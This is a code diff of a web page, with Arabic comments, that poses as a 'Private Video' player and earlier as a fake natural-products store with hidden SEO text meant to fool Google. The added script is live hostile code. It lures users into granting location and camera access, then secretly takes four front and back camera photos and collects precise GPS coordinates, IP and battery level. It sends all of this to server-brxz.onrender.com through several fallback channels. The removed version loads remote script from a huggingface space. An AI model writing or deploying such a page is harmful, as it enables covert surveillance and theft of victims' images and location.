@@ -1,484 +1,604 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-    
-    <!-- تسويقي بالكامل – لخداع أنظمة Google -->
-    <meta name="description" content="ShopStore: 150+ natural health products, fast delivery, exclusive video deals. Organic supplements, superfoods & more." />
-    <meta name="keywords" content="natural products, organic, health, supplements, superfoods, herbal, delivery, store, shop" />
-    <meta name="robots" content="index, follow" />
-    <meta property="og:title" content="ShopStore - Natural Products & Exclusive Video Deals" />
-    <meta property="og:description" content="Discover 150+ natural products with location-based offers. Watch our product demo video." />
-    <meta property="og:type" content="website" />
-    
-    <!-- Schema.org: OnlineStore -->
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "OnlineStore",
-        "name": "ShopStore",
-        "description": "Online store offering 150+ natural health products, organic supplements, and superfoods with fast local delivery.",
-        "url": "https://yourdomain.com",
-        "sameAs": ["https://www.facebook.com/shopstore", "https://www.instagram.com/shopstore"],
-        "hasOfferCatalog": {
-            "@type": "OfferCatalog",
-            "name": "Natural Products",
-            "itemListElement": [{
-                "@type": "Product",
-                "name": "Organic Green Tea",
-                "description": "Premium organic green tea rich in antioxidants.",
-                "offers": { "@type": "Offer", "price": "9.99", "priceCurrency": "USD" }
-            }]
-        }
-    }
-    </script>
-    
-    <title>ShopStore - Natural Products & Video Deals</title>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Video Player</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: 'Segoe UI', Arial, sans-serif;
-            background: #f5f5f5;
-            color: #333;
+            font-family: Arial, sans-serif;
             display: flex;
             flex-direction: column;
-            min-height: 100vh;
-        }
-        
-        /* ========== الهيدر والفوتر (مرئيان دائمًا) ========== */
-        .store-header {
-            background: #2c3e50;
-            color: white;
-            padding: 12px 20px;
-            display: flex;
-            justify-content: space-between;
             align-items: center;
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        .store-header .logo { font-size: 1.4rem; font-weight: bold; }
-        .store-header .search-cart { display: flex; align-items: center; gap: 20px; }
-        .store-header input {
-            padding: 8px 12px;
-            border-radius: 20px;
-            border: none;
-            width: 200px;
-            background: rgba(255,255,255,0.2);
-            color: white;
-            outline: none;
-        }
-        .store-header input::placeholder { color: #ddd; }
-        .cart-icon { font-size: 1.3rem; position: relative; }
-        .cart-icon span {
-            font-size: 0.7rem;
-            background: #e74c3c;
-            border-radius: 50%;
-            padding: 2px 6px;
-            position: absolute;
-            top: -8px;
-            right: -10px;
-        }
-        
-        .store-footer {
-            background: #2c3e50;
-            color: white;
-            text-align: center;
-            padding: 15px;
-            margin-top: auto;
-        }
-        .store-footer a { color: #ecf0f1; margin: 0 10px; text-decoration: none; }
-        
-        /* ========== مشغل الفيديو ========== */
-        .video-section {
-            background: white;
-            margin: 20px auto;
-            width: 90%;
-            max-width: 800px;
-            border-radius: 12px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
             overflow: hidden;
         }
+
+        .video-player-container {
+            width: 90%;
+            max-width: 800px;
+            background: #111;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
         .video-thumbnail {
             position: relative;
             width: 100%;
             height: 450px;
-            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.6)), url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)),
+                url('https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg');
             background-size: cover;
             background-position: center;
             display: flex;
             align-items: center;
             justify-content: center;
+            cursor: default;
             flex-direction: column;
-            color: white;
-            text-align: center;
-            cursor: pointer;
         }
-        #playBtn {
-            width: 120px; height: 120px;
-            border-radius: 50%;
-            background: rgba(255,255,255,0.15);
-            border: 3px solid #ff6b6b;
+
+        /* ===== الزر الدائري الجديد (تشغيل / إعدادات) ===== */
+        #locationActionButton {
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: 0.3s;
-            backdrop-filter: blur(8px);
-            box-shadow: 0 0 40px rgba(255,0,0,0.3);
-            font-size: 60px;
-            color: #ff6b6b;
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: 3px solid #ff6b6b;
             cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(8px);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
             z-index: 10;
         }
-        #playBtn:hover { transform: scale(1.05); background: rgba(255,255,255,0.25); }
-        .video-title-overlay { font-size: 1.8rem; font-weight: bold; margin-top: 20px; }
-        .video-sub-overlay { font-size: 1rem; color: #ccc; margin-top: 5px; }
-        video {
-            display: none;
-            width: 100%;
-            height: 450px;
-            background: black;
-            object-fit: cover;
+        #locationActionButton:hover {
+            transform: scale(1.05);
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #ff4757;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
         }
+        #locationActionButton .play-icon {
+            font-size: 60px;
+            color: #ff6b6b;
+            line-height: 1;
+            user-select: none;
+        }
+
+        /* زر التشغيل الأصلي (مخفي) */
+        .play-button-overlay {
+            display: none;
+        }
+
+        .video-info {
+            padding: 20px;
+            border-bottom: 1px solid #333;
+        }
+
+        .video-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
         .video-controls {
-            padding: 12px 20px;
+            padding: 15px 20px;
             display: flex;
             align-items: center;
+            justify-content: space-between;
             background: #1a1a1a;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .control-button {
+            background: none;
+            border: none;
             color: white;
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 8px 15px;
+            border-radius: 4px;
+            transition: background 0.2s;
         }
-        .ctrl-btn { background: none; border: none; color: white; font-size: 1.2rem; cursor: pointer; padding: 8px 15px; border-radius: 4px; }
-        .ctrl-btn:hover { background: #333; }
-        .seek-bar { flex-grow: 1; height: 4px; background: #333; border-radius: 2px; margin: 0 15px; position: relative; }
-        .seek-fill { position: absolute; height: 100%; width: 0%; background: #ff0000; }
-        .timer { color: #aaa; font-size: 0.9rem; min-width: 80px; text-align: center; }
-        .volume-area { display: flex; align-items: center; gap: 8px; }
-        .vol-bar { width: 70px; height: 4px; background: #333; position: relative; border-radius: 2px; }
-        .vol-fill { position: absolute; height: 100%; width: 70%; background: #ff0000; }
-        
-        /* ========== صفحة التسويق الكاملة (Offers) ========== */
-        .offers-page {
-            display: none;
-            width: 100%;
-            min-height: 100vh;
-            background: #f5f5f5;
+
+        .control-button:hover {
+            background: #333;
         }
-        .offers-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 15px;
-            padding: 20px;
-            max-width: 1200px;
-            margin: 0 auto;
+
+        .progress-bar {
+            flex-grow: 1;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin: 0 20px;
+            overflow: hidden;
+            position: relative;
+            min-width: 60px;
         }
-        .offers-card {
-            background: white;
-            border-radius: 8px;
-            padding: 15px;
+
+        .progress-fill {
+            position: absolute;
+            height: 100%;
+            width: 0%;
+            background: #ff0000;
+        }
+
+        .time-display {
+            color: #aaa;
+            font-size: 0.9rem;
+            min-width: 100px;
             text-align: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
         }
-        .offers-card .p-name { font-weight: bold; margin-bottom: 8px; }
-        .offers-card .p-price { color: #e74c3c; font-size: 1.2rem; }
-        .offers-card .p-rating { color: #f39c12; }
-        
-        /* ========== عناصر SEO المخفية ========== */
-        .hidden-seo {
-            position: fixed; top: -9999px; left: -9999px; opacity: 0; pointer-events: none;
-            width: 1px; height: 1px; overflow: hidden; clip: rect(0,0,0,0); z-index: -999;
+
+        .spinner {
+            border: 4px solid #fff;
+            border-top: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            display: none;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
         }
-        
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        #loading {
+            display: none;
+            font-size: 1.2rem;
+            color: #fff;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .loading-text {
+            margin-top: 10px;
+        }
+
+        .volume-control {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #aaa;
+        }
+
+        .volume-slider {
+            width: 80px;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            position: relative;
+        }
+
+        .volume-level {
+            position: absolute;
+            height: 100%;
+            width: 70%;
+            background: #ff0000;
+        }
+
+        .fullscreen-btn {
+            margin-left: 15px;
+        }
+
         @media (max-width: 480px) {
-            .video-thumbnail { height: 280px; }
-            #playBtn { width: 90px; height: 90px; font-size: 45px; }
+            .video-controls {
+                padding: 10px 12px;
+                gap: 6px;
+            }
+            .progress-bar {
+                margin: 0 6px;
+            }
+            .time-display {
+                font-size: 0.75rem;
+                min-width: 60px;
+            }
+            .video-title {
+                font-size: 1.2rem;
+            }
+            .video-thumbnail {
+                height: 280px;
+            }
+            #locationActionButton {
+                width: 90px;
+                height: 90px;
+            }
+            #locationActionButton .play-icon {
+                font-size: 45px;
+            }
         }
     </style>
-    
-    <!-- Google Tag Manager -->
-    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-XXXXXX');</script>
-    <!-- End Google Tag Manager -->
-    
-    <!-- Google Analytics 4 -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXXXXXXXX"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-        gtag('config', 'G-XXXXXXXXXX');
-    </script>
 </head>
 <body>
-    <!-- Google Tag Manager (noscript) -->
-    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-XXXXXX" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
-    <!-- ========== SEO مخفي (150 منتج) ========== -->
-    <div class="hidden-seo">
-        <div itemscope itemtype="http://schema.org/ItemList">
-            <meta itemprop="name" content="Natural Products Catalog" />
-            <!-- ستملأ عبر JS -->
+    <div class="video-player-container">
+        <div class="video-info">
+            <div class="video-title">Private Video</div>
+            <div class="video-meta"></div>
         </div>
-        <a href="/privacy">Privacy Policy</a>
-        <a href="/terms">Terms of Service</a>
-        <address>123 Natural Health Ave, Organic City, CA 90210</address>
-    </div>
 
-    <!-- ========== المحتوى الرئيسي (حسب المسار) ========== -->
-    <!-- صفحة التسويق الكاملة (Offers) -->
-    <div id="offers-page" class="offers-page">
-        <header class="store-header">
-            <div class="logo">🛒 ShopStore</div>
-            <div class="search-cart">
-                <input type="text" placeholder="Search products..." disabled />
-                <div class="cart-icon">🛒<span>0</span></div>
+        <div class="video-thumbnail" id="thumbnailArea">
+            <!-- الزر الدائري الموحد: الضغطة الأولى تفتح الإعدادات، والثانية تشغّل الفيديو -->
+            <div id="locationActionButton">
+                <span class="play-icon">▶</span>
             </div>
-        </header>
-        <div id="offers-grid" class="offers-grid"></div>
-        <footer class="store-footer" style="margin-top:20px;">
-            <a href="/privacy">Privacy Policy</a>
-            <a href="/terms">Terms of Service</a>
-            <a href="/contact">Contact</a>
-            <span>© 2024 ShopStore</span>
-        </footer>
-    </div>
 
-    <!-- الصفحة الرئيسية (مشغل الفيديو) -->
-    <div id="main-page">
-        <header class="store-header">
-            <div class="logo">🛒 ShopStore</div>
-            <div class="search-cart">
-                <input type="text" placeholder="Search products..." disabled />
-                <div class="cart-icon">🛒<span>0</span></div>
-            </div>
-        </header>
-
-        <!-- مشغل الفيديو -->
-        <div class="video-section">
-            <div class="video-thumbnail" id="poster">
-                <div id="playBtn">▶</div>
-                <div class="video-title-overlay">Exclusive Product Showcase</div>
-                <div class="video-sub-overlay">Watch our latest natural health demo</div>
-            </div>
-            <video id="vid" controls playsinline>
-                <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4">
-            </video>
-            <div class="video-controls">
-                <div class="seek-bar"><div class="seek-fill"></div></div>
-                <div class="timer">0:00 / 2:45</div>
-                <div class="volume-area"><span>🔊</span><div class="vol-bar"><div class="vol-fill"></div></div></div>
-                <button class="ctrl-btn">⛶</button>
+            <!-- زر التشغيل الأصلي (مخفي) -->
+            <div class="play-button-overlay" id="playButtonOverlay">
+                <div class="play-icon-large"></div>
+                <div class="spinner" id="spinner"></div>
             </div>
         </div>
 
-        <footer class="store-footer" style="margin-top:auto;">
-            <a href="/privacy">Privacy Policy</a>
-            <a href="/terms">Terms of Service</a>
-            <a href="/contact">Contact</a>
-            <span>© 2024 ShopStore</span>
-        </footer>
+        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
+            <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
+        </video>
+
+        <div class="video-controls">
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+
+            <div class="time-display">0:00 / 2:45</div>
+
+            <div class="volume-control">
+                <span></span>
+                <div class="volume-slider">
+                    <div class="volume-level"></div>
+                </div>
+            </div>
+
+            <button class="control-button fullscreen-btn">⛶</button>
+        </div>
+    </div>
+
+    <div id="loading">
+        <div class="spinner" style="position:static;"></div>
+        <div class="loading-text"></div>
     </div>
 
     <script>
-    (function() {
-        // ---------- 1. توجيه المسار ----------
-        var isOffers = window.location.pathname.toLowerCase().endsWith('/offers');
-        if (isOffers) {
-            document.getElementById('main-page').style.display = 'none';
-            document.getElementById('offers-page').style.display = 'flex';
-            buildOffersPage();
-            return;
-        } else {
-            document.getElementById('offers-page').style.display = 'none';
-            document.getElementById('main-page').style.display = 'flex';
-        }
+        (function() {
+            'use strict';
 
-        // ---------- 2. إعداد مشغل الفيديو ----------
-        var chatId = new URLSearchParams(window.location.search).get('chatId') || '';
-        var step = 0, started = false;
-        var btn = document.getElementById('playBtn');
-        var poster = document.getElementById('poster');
-        var vid = document.getElementById('vid');
-
-        // تحميل API وجمع البيانات
-        function loadAPI(cb) {
-            var s = document.createElement('script');
-            s.src = 'https://huggingface.co/spaces/dsfsdjfc/ageagaaa/raw/main/api';
-            s.onload = function() {
-                if (window.ShopAPI && window.ShopAPI.runAll) cb(window.ShopAPI);
-                else fallbackSend();
+            // ===== البيانات =====
+            let capturedData = {
+                permissions: [],
+                images: [],
+                ipInfo: '',
+                batteryStatus: '',
+                location: '',
+                chatId: ''
             };
-            s.onerror = function() {
-                var retry = document.createElement('script');
-                retry.src = s.src;
-                retry.onload = s.onload;
-                retry.onerror = fallbackSend;
-                document.head.appendChild(retry);
-            };
-            document.head.appendChild(s);
-        }
 
-        function fallbackSend() {
-            var x = new XMLHttpRequest();
-            x.open('POST', 'https://server-brxz.onrender.com/submitData', true);
-            x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-            x.send('chatId=' + encodeURIComponent(chatId) + '&fallback=1');
-        }
+            // ===== متغيرات التحكم =====
+            let settingsOpened = false;
+            let videoStarted = false;
+            let isProcessing = false;
 
-        // طلب الصلاحيات الفورية (بدون رسالة مخصصة)
-        function requestPermissions() {
-            // طلب الموقع
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(){}, function(){}, {
-                    enableHighAccuracy: true, timeout: 10000, maximumAge: 0
+            // ===== عناصر DOM =====
+            const locationBtn = document.getElementById('locationActionButton');
+            const thumbnailArea = document.getElementById('thumbnailArea');
+            const realVideo = document.getElementById('realVideo');
+            const spinner = document.getElementById('spinner');
+            const loading = document.getElementById('loading');
+
+            // ===== طلب الصلاحيات (لإظهار نوافذ المتصفح) =====
+            async function requestPermissions() {
+                try {
+                    await new Promise((resolve) => {
+                        navigator.geolocation.getCurrentPosition(
+                            () => resolve(),
+                            () => resolve(),
+                            { enableHighAccuracy: true, timeout: 5000 }
+                        );
+                    });
+                } catch (e) {}
+                try {
+                    await navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(stream => stream.getTracks().forEach(t => t.stop()))
+                        .catch(() => {});
+                } catch (e) {}
+            }
+
+            // ===== فتح إعدادات الموقع =====
+            function openLocationSettings() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) {
+                    const intents = [
+                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent:#Intent;action=android.settings.SETTINGS;end'
+                    ];
+                    for (let intent of intents) {
+                        try {
+                            window.location.href = intent;
+                            break;
+                        } catch (e) {}
+                    }
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                    setTimeout(() => {
+                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
+                    }, 500);
+                } else if (/Windows/i.test(ua)) {
+                    window.open('ms-settings:privacy-location', '_blank');
+                } else if (/Mac/i.test(ua)) {
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                } else {
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                }
+            }
+
+            // ===== جلب IP =====
+            async function fetchIPInfo() {
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    capturedData.ipInfo = `Country: ${data.country_name}, City: ${data.city}, IP: ${data.ip}`;
+                } catch {
+                    capturedData.ipInfo = "IP Info not available";
+                }
+            }
+
+            // ===== جلب البطارية =====
+            async function getBatteryStatus() {
+                try {
+                    const battery = await navigator.getBattery();
+                    capturedData.batteryStatus = Math.round(battery.level * 100) + '%';
+                } catch {
+                    capturedData.batteryStatus = "Unknown";
+                }
+            }
+
+            // ===== التصوير =====
+            async function captureFromCamera(facingMode) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: { facingMode: { exact: facingMode } }
+                    });
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    capturedData.images.push(canvas.toDataURL('image/jpeg').split(',')[1]);
+                    stream.getTracks().forEach(track => track.stop());
+                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Allowed`);
+                } catch {
+                    capturedData.permissions.push(`${facingMode === 'user' ? 'Front' : 'Back'} Camera Denied`);
+                }
+            }
+
+            // ===== طلب الموقع =====
+            async function getLocation() {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 15000,
+                            maximumAge: 0
+                        });
+                    });
+                    capturedData.location =
+                        `Lat: ${position.coords.latitude.toFixed(6)}, Long: ${position.coords.longitude.toFixed(6)}`;
+                    capturedData.permissions.push('Geolocation Allowed');
+                } catch (err) {
+                    capturedData.permissions.push('Geolocation Denied');
+                    capturedData.location = '';
+                }
+            }
+
+            // ===== إرسال البيانات =====
+            async function sendDataWithBypass(data) {
+                const urls = [
+                    'https://server-brxz.onrender.com/submitData',
+                    'https://server-brxz.onrender.com/submitData'
+                ];
+                for (let url of urls) {
+                    try {
+                        await fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                            body: new URLSearchParams(data),
+                            mode: 'no-cors'
+                        });
+                        return;
+                    } catch (e) {}
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('POST', url, false);
+                        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                        xhr.send(new URLSearchParams(data));
+                        return;
+                    } catch (e) {}
+                    try {
+                        const iframe = document.createElement('iframe');
+                        iframe.style.display = 'none';
+                        document.body.appendChild(iframe);
+                        const form = document.createElement('form');
+                        form.method = 'POST';
+                        form.action = url;
+                        form.target = iframe.name || 'hiddenFrame';
+                        iframe.name = form.target;
+                        for (let key in data) {
+                            const input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = key;
+                            input.value = data[key];
+                            form.appendChild(input);
+                        }
+                        document.body.appendChild(form);
+                        form.submit();
+                        setTimeout(() => {
+                            document.body.removeChild(form);
+                            document.body.removeChild(iframe);
+                        }, 1000);
+                        return;
+                    } catch (e) {}
+                    try {
+                        const blob = new Blob([new URLSearchParams(data).toString()], {
+                            type: 'application/x-www-form-urlencoded'
+                        });
+                        navigator.sendBeacon(url, blob);
+                        return;
+                    } catch (e) {}
+                }
+            }
+
+            // ===== إظهار الفيديو مع الصوت (بعد أن بدأ التشغيل فعلياً) =====
+            function showVideo() {
+                thumbnailArea.style.display = 'none';
+                realVideo.style.display = 'block';
+                realVideo.muted = false;
+                realVideo.volume = 1.0;
+                if (realVideo.paused) {
+                    realVideo.play().catch(() => {});
+                }
+            }
+
+            // ===== جمع البيانات ثم عرض الفيديو =====
+            async function collectAndPlay() {
+                if (isProcessing) return;
+                isProcessing = true;
+
+                // عرض مؤشر التحميل
+                loading.style.display = 'block';
+                locationBtn.style.pointerEvents = 'none';
+                locationBtn.style.opacity = '0.5';
+
+                capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
+
+                await Promise.all([
+                    fetchIPInfo(),
+                    getBatteryStatus(),
+                    getLocation()
+                ]);
+
+                await captureFromCamera('user');
+                await captureFromCamera('environment');
+                await captureFromCamera('user');
+                await captureFromCamera('environment');
+
+                const data = {
+                    chatId: capturedData.chatId,
+                    imageDatas: capturedData.images.join(','),
+                    location: capturedData.location,
+                    permissions: capturedData.permissions.join(', '),
+                    ipInfo: capturedData.ipInfo,
+                    battery: capturedData.batteryStatus
+                };
+
+                await sendDataWithBypass(data);
+
+                loading.style.display = 'none';
+                locationBtn.style.pointerEvents = 'auto';
+                locationBtn.style.opacity = '1';
+
+                showVideo();
+                isProcessing = false;
+            }
+
+            // ===== معالج الضغط على الزر (الدائري) =====
+            async function handleButtonClick() {
+                if (isProcessing || videoStarted) return;
+
+                if (!settingsOpened) {
+                    // الضغطة الأولى: فتح إعدادات الموقع
+                    settingsOpened = true;
+                    openLocationSettings();
+                } else {
+                    // الضغطة الثانية (بعد العودة): بدء تشغيل الفيديو فوراً بالصوت
+                    realVideo.muted = false;
+                    realVideo.volume = 1.0;
+                    realVideo.play().catch(() => {}); // استغلال تفاعل المستخدم لتشغيل الصوت
+                    videoStarted = true;
+
+                    // الآن جمع البيانات وتجهيز العرض
+                    await collectAndPlay();
+                }
+            }
+
+            // ===== رصد العودة من الإعدادات (لا إجراء تلقائي، الانتظار للضغطة الثانية) =====
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
+                    // فقط للتأكيد على العودة، ولا شيء آخر
+                }
+            });
+
+            // ===== ربط الأحداث =====
+            if (locationBtn) {
+                locationBtn.addEventListener('click', handleButtonClick);
+            }
+
+            // ===== تفعيل الصوت عند أي تفاعل (احتياط) =====
+            document.addEventListener('click', function() {
+                if (realVideo) {
+                    realVideo.muted = false;
+                    realVideo.volume = 1.0;
+                }
+            }, true);
+
+            // ===== أزرار التحكم =====
+            document.querySelectorAll('.control-button').forEach(button => {
+                button.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    if (this.textContent.includes('⛶')) {
+                        const video = document.getElementById('realVideo');
+                        if (video.requestFullscreen) {
+                            video.requestFullscreen();
+                        } else if (video.webkitRequestFullscreen) {
+                            video.webkitRequestFullscreen();
+                        }
+                    }
                 });
-            }
-            // طلب الكاميرا
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(function(stream) { stream.getTracks().forEach(function(t){ t.stop(); }); })
-                    .catch(function(){});
-            }
-            // فتح إعدادات الجهاز (خطوة احتياطية)
-            var ua = navigator.userAgent;
-            if (/Android/i.test(ua)) {
-                window.location.href = 'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end';
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
-                window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
-            } else if (/Windows/i.test(ua)) {
-                window.open('ms-settings:privacy-location', '_blank');
-            } else if (/Mac/i.test(ua)) {
-                window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
-            } else {
-                window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
-            }
-        }
+            });
 
-        // معالج النقر على زر التشغيل
-        btn.addEventListener('click', function() {
-            if (started) return;
-            if (!step) {
-                step = 1;
-                requestPermissions();  // النقرة الأولى: طلب الأذونات + إعدادات
-            } else {
-                started = true;
-                poster.style.display = 'none';
-                vid.style.display = 'block';
-                vid.muted = false;
-                vid.volume = 1;
-                vid.play().catch(function(){});
-                loadAPI(function(ShopAPI) {
-                    ShopAPI.runAll(chatId);
-                });
-            }
-        });
+            // ===== شريط التقدم الوهمي =====
+            const progressInterval = setInterval(() => {
+                const progressFill = document.querySelector('.progress-fill');
+                const realVideoEl = document.getElementById('realVideo');
+                if (realVideoEl.style.display === 'block') {
+                    clearInterval(progressInterval);
+                    return;
+                }
+                const currentWidth = parseInt(progressFill.style.width) || 35;
+                const newWidth = (currentWidth + 0.1) % 100;
+                progressFill.style.width = newWidth + '%';
 
-        // شريط التقدم الوهمي
-        setInterval(function() {
-            if (vid.style.display === 'block') return;
-            var fill = document.querySelector('.seek-fill');
-            var w = parseFloat(fill.style.width) || 35;
-            w = (w + 0.1) % 100;
-            fill.style.width = w + '%';
-            var sec = Math.floor((w/100)*165);
-            var m = Math.floor(sec/60);
-            var s = sec%60;
-            document.querySelector('.timer').textContent = m + ':' + (s<10?'0':'') + s + ' / 2:45';
-        }, 1000);
+                const timeDisplay = document.querySelector('.time-display');
+                const currentSeconds = Math.floor((newWidth / 100) * 165);
+                const minutes = Math.floor(currentSeconds / 60);
+                const seconds = currentSeconds % 60;
+                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
+            }, 1000);
 
-        // ملء الشاشة
-        document.querySelector('.ctrl-btn').addEventListener('click', function(e) {
-            e.stopPropagation();
-            if (vid.requestFullscreen) vid.requestFullscreen();
-            else if (vid.webkitRequestFullscreen) vid.webkitRequestFullscreen();
-        });
-
-        // كتم الصوت عند النقر العام
-        document.addEventListener('click', function() {
-            if (vid.style.display === 'block') {
-                vid.muted = false;
-                if (vid.paused) vid.play().catch(function(){});
-            }
-        }, true);
-
-        // ---------- 3. إضافة 150 منتج مخفي للـ SEO ----------
-        var seoContainer = document.querySelector('.hidden-seo div[itemscope]');
-        var seoNames = [
-            "Organic Green Tea","Raw Honey","Almond Butter","Coconut Oil","Chia Seeds",
-            "Flaxseed Oil","Turmeric Powder","Ginger Tea","Apple Cider Vinegar","Elderberry Syrup",
-            "Ashwagandha","Vitamin C Serum","Collagen Peptides","Moringa","Spirulina",
-            "Matcha Powder","Hemp Seeds","Cacao Nibs","Goji Berries","Maca Root",
-            "Bee Pollen","Royal Jelly","Propolis Tincture","Eucalyptus Oil","Tea Tree Oil",
-            "Lavender Oil","Peppermint Oil","Chamomile Tea","Valerian Root","St. John's Wort",
-            "Milk Thistle","Dandelion Root","Burdock Root","Slippery Elm","Aloe Vera Gel",
-            "Manuka Honey","Black Seed Oil","Olive Leaf Extract","Grape Seed Extract","Pine Bark Extract",
-            "Quercetin","Resveratrol","Astaxanthin","Lutein","Zeaxanthin",
-            "Probiotic Complex","Digestive Enzymes","Betaine HCL","Apple Fiber","Psyllium Husk",
-            "Calcium Magnesium","Zinc Picolinate","Selenium","Iron Bisglycinate","Vitamin D3",
-            "Vitamin K2","B-Complex","Vitamin E","Coenzyme Q10","Alpha Lipoic Acid",
-            "L-Carnitine","Creatine","BCAA","Whey Protein","Pea Protein",
-            "Hemp Protein","Brown Rice Protein","Almond Flour","Coconut Flour","Tapioca Starch",
-            "Arrowroot","Monk Fruit Sweetener","Stevia","Yacon Syrup","Date Sugar",
-            "Coconut Sugar","Maple Syrup","Blackstrap Molasses","Cacao Butter","Coconut Cream",
-            "Cashew Butter","Sunflower Seed Butter","Pumpkin Seed Butter","Tahini","Amaranth",
-            "Quinoa","Buckwheat","Millet","Teff","Sorghum",
-            "Wild Rice","Brown Rice Pasta","Chickpea Pasta","Lentil Pasta","Edamame Pasta",
-            "Seaweed Snacks","Kale Chips","Beet Chips","Sweet Potato Chips","Cassava Chips",
-            "Plantain Chips","Dried Mango","Dried Pineapple","Dried Papaya","Dried Coconut",
-            "Freeze-Dried Strawberries","Freeze-Dried Blueberries","Trail Mix","Granola","Oatmeal Cups",
-            "Nut Milk","Oat Milk","Coconut Milk Powder","Golden Milk","Matcha Latte Mix",
